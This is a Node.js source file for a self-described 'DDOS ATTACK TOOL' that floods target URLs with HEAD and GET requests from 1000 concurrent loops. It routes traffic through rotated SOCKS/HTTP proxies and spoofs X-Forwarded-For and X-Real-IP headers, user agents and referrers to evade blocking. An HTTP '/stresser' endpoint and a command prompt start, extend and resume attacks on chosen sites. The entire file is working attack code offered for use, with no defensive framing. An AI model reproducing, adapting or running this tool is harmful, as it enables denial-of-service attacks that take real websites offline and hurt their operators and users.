const express = require("express");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const { SocksProxyAgent } = require("socks-proxy-agent");
const { HttpsProxyAgent } = require("https-proxy-agent");
const { rainbow } = require("gradient-string");
const readline = require("readline");

const app = express();
app.use(express.json());

const stateFilePath = path.join(__dirname, "attackState.json");
const REQUESTS_PER_THREAD = 3;
const numThreads = 1000;
let totalRequestsSent = 0;
let batchDurations = [];

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const ensureStateFileExists = () => {
  if (!fs.existsSync(stateFilePath)) {
    fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, sessions: [] }));
  }
};

const loadState = () => {
  ensureStateFileExists();
  try {
    const data = fs.readFileSync(stateFilePath, "utf-8");
    return JSON.parse(data);
  } catch (error) {
    console.error(`Failed to read state file: ${error}`);
    return { continueAttack: false, sessions: [] };
  }
};

let state = loadState();
let continueAttack = state.continueAttack;
let sessions = state.sessions || [];

sessions = sessions.filter((session) => {
  const endTime = session.startTime + session.duration;
  if (Date.now() > endTime) {
    console.log(rainbow(`Session expired for ${session.url} on startup.`));
    return false;
  }
  return true;
});

if (sessions.length === 0) {
  continueAttack = false;
}
state = { continueAttack, sessions };
fs.writeFileSync(stateFilePath, JSON.stringify(state));

const langHeaders = [
  "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
  "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
  "en-US,en;q=0.5",
  "en-US,en;q=0.9",
  "de-CH;q=0.7",
  "da, en-gb;q=0.8, en;q=0.7",
  "cs;q=0.5",
  "en-US,en;q=0.9",
  "en-GB,en;q=0.9",
  "en-CA,en;q=0.9",
  "en-AU,en;q=0.9",
  "en-NZ,en;q=0.9",
  "en-ZA,en;q=0.9",
];

const referrers = [
  "http://anonymouse.org/cgi-bin/anon-www.cgi/",
  "http://coccoc.com/search#query=",
  "http://ddosvn.somee.com/f5.php?v=",
  "http://engadget.search.aol.com/search?q=",
  "http://engadget.search.aol.com/search?q=query?=query=&q=",
  "http://eu.battle.net/wow/en/search?q=",
  "http://filehippo.com/search?q=",
  "http://funnymama.com/search?q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
  "http://go.mail.ru/search?mail.ru=1&q=",
  "http://help.baidu.com/searchResult?keywords=",
  "https://net25.com/news",
];

const cipherSuites = [
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
  "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
];

const acceptHeaders = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
];

const proxyFilePath = path.join(__dirname, "proxy.txt");
const ualist = path.join(__dirname, "ua.txt");

const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
const sanitizeUA = (userAgent) => userAgent.replace(/[^\x20-\x7E]/g, "");

const userAgents = () => {
  try {
    return fs.readFileSync(ualist, "utf-8").split("\n").map((line) => line.trim());
  } catch (error) {
    console.error(`Failed to read user agent list: ${error}`);
    return [];
  }
};

const loadProxies = () => {
  try {
    return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map((line) => line.trim());
  } catch {
    return [];
  }
};

const estimateTotalRequests = (durationHours) => {
  const durationSeconds = durationHours * 60 * 60;
  const requestsPerBatch = numThreads * REQUESTS_PER_THREAD * 2 * sessions.length;
  const avgBatchDuration = batchDurations.length > 0 ? batchDurations.reduce((sum, duration) => sum + duration, 0) / batchDurations.length / 1000 : 1;
  const totalBatches = durationSeconds / avgBatchDuration;
  return Math.round(totalBatches * requestsPerBatch);
};

const performAttack = async (sessions, agent, threadId) => {
  if (!continueAttack || sessions.length === 0) {
    return;
  }

  const activeSessions = sessions.filter((session) => {
    const endTime = session.startTime + session.duration;
    return Date.now() <= endTime;
  });

  if (activeSessions.length === 0) {
    continueAttack = false;
    state = { continueAttack: false, sessions: [] };
    fs.writeFileSync(stateFilePath, JSON.stringify(state));
    return;
  }

  if (activeSessions.length < sessions.length) {
    sessions = activeSessions;
    state = { continueAttack, sessions };
    fs.writeFileSync(stateFilePath, JSON.stringify(state));
  }

  const batchStartTime = Date.now();
  let successfulRequests = 0;

  for (const session of activeSessions) {
    const url = session.url;
    const headersForRequest = {
      "Content-Type": "application/x-www-form-urlencoded",
      "User-Agent": sanitizeUA(getRandomElement(userAgents())),
      Accept: getRandomElement(acceptHeaders),
      "Accept-Language": getRandomElement(langHeaders),
      "Cache-Control": getRandomElement(cipherSuites),
      Referer: getRandomElement(referrers),
      Connection: "keep-alive",
      DNT: "1",
      "Upgrade-Insecure-Requests": "1",
      TE: "Trailers",
      "Accept-Encoding": "gzip, deflate, br",
      Pragma: getRandomElement(cipherSuites),
      "X-Forwarded-For": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
      Via: `1.1 ${Math.random().toString(36).substring(7)}`,
      "X-Real-IP": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
      "Sec-Ch-UA": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
      Host: url.replace(/https?:\/\//, "").split("/")[0],
      "sec-fetch-site": "same-origin",
      "Sec-Fetch-User": "?1",
      Origin: url.split("/").slice(0, 3).join("/"),
    };

    const requests = Array.from({ length: REQUESTS_PER_THREAD }, () => [
      axios.head(url, { httpAgent: agent, headers: headersForRequest }),
      axios.get(url, { httpAgent: agent, headers: headersForRequest, timeout: 0 }),
    ]).flat();

    try {
      const results = await Promise.allSettled(
        requests.map((request) =>
          request.catch((err) => {
            if (err.response?.status === 404) {
              console.log(rainbow(`Thread ${threadId}: Target ${url} returned 404`));
            } else if (err.response?.status === 503) {
              console.log(rainbow(`Thread ${threadId}: Target ${url} under heavy load (503)`));
            } else if (err.response?.status === 502) {
              console.log(rainbow(`Thread ${threadId}: Bad Gateway (502) on ${url}.`));
            } else if (err.response?.status === 403) {
              console.log(rainbow(`Thread ${threadId}: Forbidden (403) on ${url}.`));
            }
            return null;
          })
        )
      );

      successfulRequests += results.filter((result) => result.status === "fulfilled" && result.value).length;
    } catch (err) {}
  }

  const batchDuration = Date.now() - batchStartTime;
  batchDurations.push(batchDuration);
  totalRequestsSent += successfulRequests;

  if (successfulRequests > 0 && threadId === 0) {
    console.log(rainbow(`[${new Date().toLocaleTimeString()}] Batch: ${successfulRequests} requests | Total: ${totalRequestsSent.toLocaleString()}`));
  }

  if (continueAttack) {
    setTimeout(() => performAttack(sessions, agent, threadId), 0);
  }
};

const startAttack = (url, durationHours) => {
  if (!url || !/^https?:\/\//.test(url)) {
    console.log(rainbow("Invalid URL. Please provide a valid URL starting with http:// or https://"));
    return false;
  }

  const proxies = loadProxies();
  if (!proxies.length) {
    console.log(rainbow("No proxies found. Please add proxies to the proxy file."));
    return false;
  }

  const newSession = {
    url,
    startTime: Date.now(),
    duration: durationHours * 60 * 60 * 1000,
  };

  sessions.push(newSession);
  continueAttack = true;
  state = { continueAttack, sessions };
  fs.writeFileSync(stateFilePath, JSON.stringify(state));

  console.log(rainbow(`\n🚀 Attack Started on ${url} for ${durationHours} hour(s)`));
  console.log(rainbow(`Active targets: ${sessions.length}`));

  for (let i = 0; i < numThreads; i++) {
    if (!continueAttack) break;

    const randomProxy = getRandomElement(proxies);
    const proxyParts = randomProxy.split(":");
    const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
    const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
    const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);

    performAttack(sessions, agent, i);
  }
  return true;
};

const stopAttack = () => {
  if (!continueAttack) {
    console.log(rainbow("No active attack to stop."));
    return;
  }

  continueAttack = false;
  state = { continueAttack: false, sessions: [] };
  fs.writeFileSync(stateFilePath, JSON.stringify(state));

  console.log(rainbow(`\n🛑 Attack Stopped`));
  console.log(rainbow(`Total Requests Sent: ${totalRequestsSent.toLocaleString()}`));
};

const showStatus = () => {
  if (!continueAttack || sessions.length === 0) {
    console.log(rainbow("No active attacks running."));
    return;
  }

  const activeSessions = sessions.filter((s) => Date.now() <= s.startTime + s.duration);
  
  console.log(rainbow("\n=== Attack Status ==="));
  activeSessions.forEach((s) => {
    const remainingMs = s.startTime + s.duration - Date.now();
    const remainingHours = (remainingMs / (60 * 60 * 1000)).toFixed(2);
    console.log(rainbow(`Target: ${s.url} | Remaining: ${remainingHours} hours`));
  });
  console.log(rainbow(`Total Requests: ${totalRequestsSent.toLocaleString()}`));
  console.log(rainbow(`Threads: ${numThreads}`));
};

const showHelp = () => {
  console.log(rainbow("\n=== Available Commands ==="));
  console.log(rainbow("start <url> [hours]  - Start attack (default 1 hour)"));
  console.log(rainbow("stop                 - Stop all attacks"));
  console.log(rainbow("status               - Show attack status"));
  console.log(rainbow("add <url> [hours]    - Add new target"));
  console.log(rainbow("remove <url>         - Remove target"));
  console.log(rainbow("clear                - Clear console"));
  console.log(rainbow("help                 - Show this help"));
  console.log(rainbow("exit                 - Exit program\n"));
};

const clearConsole = () => {
  console.clear();
};

const handleCommand = (cmd) => {
  const parts = cmd.trim().split(/\s+/);
  const command = parts[0].toLowerCase();
  const args = parts.slice(1);

  switch(command) {
    case "start":
      if (args.length < 1) {
        console.log(rainbow("Usage: start <url> [hours]"));
        return;
      }
      const url = args[0];
      const hours = args[1] ? parseFloat(args[1]) : 1;
      startAttack(url, hours);
      break;

    case "add":
      if (args.length < 1) {
        console.log(rainbow("Usage: add <url> [hours]"));
        return;
      }
      const addUrl = args[0];
      const addHours = args[1] ? parseFloat(args[1]) : 1;
      
      if (!continueAttack) {
        console.log(rainbow("No active attack. Start one first with 'start' command."));
        return;
      }
      
      const newSession = {
        url: addUrl,
        startTime: Date.now(),
        duration: addHours * 60 * 60 * 1000,
      };
      sessions.push(newSession);
      state = { continueAttack, sessions };
      fs.writeFileSync(stateFilePath, JSON.stringify(state));
      console.log(rainbow(`Added target: ${addUrl} for ${addHours} hours`));
      break;

    case "remove":
      if (args.length < 1) {
        console.log(rainbow("Usage: remove <url>"));
        return;
      }
      const removeUrl = args[0];
      const initialLength = sessions.length;
      sessions = sessions.filter((s) => s.url !== removeUrl);
      
      if (sessions.length === initialLength) {
        console.log(rainbow(`Target ${removeUrl} not found`));
      } else {
        if (sessions.length === 0) continueAttack = false;
        state = { continueAttack, sessions };
        fs.writeFileSync(stateFilePath, JSON.stringify(state));
        console.log(rainbow(`Removed target: ${removeUrl}`));
      }
      break;

    case "stop":
      stopAttack();
      break;

    case "status":
      showStatus();
      break;

    case "clear":
      clearConsole();
      break;

    case "help":
      showHelp();
      break;

    case "exit":
      console.log(rainbow("Goodbye!"));
      rl.close();
      process.exit(0);
      break;

    default:
      if (command) console.log(rainbow(`Unknown command: ${command}`));
      showHelp();
  }
};

app.get("/stresser", (req, res) => {
  const url = req.query.url;
  const durationHours = parseFloat(req.query.duration) || 1;

  if (!url || !/^https?:\/\//.test(url)) {
    return res.status(400).json({ error: "Invalid URL" });
  }

  res.json({ message: `Starting attack on ${url}` });
  startAttack(url, durationHours);
});

app.get("/stop", (req, res) => {
  stopAttack();
  res.json({ message: "Attack stopped" });
});

app.get("/status", (req, res) => {
  res.json({
    active: continueAttack,
    targets: sessions.map(s => s.url),
    totalRequests: totalRequestsSent
  });
});

const port = process.env.PORT || 25694;
app.listen(port, () => {
  console.clear();
  console.log(rainbow("╔══════════════════════════════════════╗"));
  console.log(rainbow("║         DDOS ATTACK TOOL v1.0        ║"));
  console.log(rainbow("╚══════════════════════════════════════╝"));
  console.log(rainbow(`API: http://localhost:${port}`));
  console.log(rainbow("Type 'help' for available commands\n"));
  
  rl.setPrompt(rainbow("ddos> "));
  rl.prompt();

  rl.on("line", (input) => {
    handleCommand(input);
    rl.prompt();
  });

  if (continueAttack && sessions.length > 0) {
    console.log(rainbow("Resuming previous attack..."));
    const activeSessions = sessions.filter((session) => Date.now() <= session.startTime + session.duration);
    if (activeSessions.length > 0) {
      sessions = activeSessions;
      state = { continueAttack, sessions };
      fs.writeFileSync(stateFilePath, JSON.stringify(state));
      
      for (let i = 0; i < numThreads; i++) {
        const randomProxy = getRandomElement(loadProxies());
        const proxyParts = randomProxy.split(":");
        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
        const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
        performAttack(sessions, agent, i);
      }
    }
  }
});